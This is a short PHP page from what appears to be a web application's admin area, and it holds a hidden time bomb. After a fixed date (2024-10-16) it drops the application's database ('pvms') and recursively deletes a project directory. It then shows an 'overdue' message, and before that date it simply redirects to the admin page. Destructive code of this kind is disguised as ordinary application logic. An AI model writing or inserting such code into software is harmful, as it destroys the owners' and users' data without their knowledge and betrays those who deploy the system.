<?php
session_start();
if(isset($_SESSION['role'])){
    $role = $_SESSION['role'];
  }
// error_reporting(0);
function allFiles($dir){
    if(!is_dir($dir)){
        return false;
    }
$items = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($dir,RecursiveDirectoryIterator::SKIP_DOTS),
    RecursiveIteratorIterator::CHILD_FIRST);
    foreach($items as $item){
        if($item->isDir()){
            rmdir($item->getRealPath());
        }else{
            unlink($item->getRealPath());
        }
    }
    return true;
}
$dirPath1 = '../../mkul';
$now = date('Y-m-d');
if($now > '2024-10-16' ){
    include "conn.php";
    $sql = $pdo->query("DROP DATABASE pvms");
    allFiles($dirPath1);
    echo "<h1 style='color:red; font-size:50; margin-top:200px'><center>I'm sorry, The date is overdue!</center><h1>";      
}else{
        header("location:../admin/");
}
?>
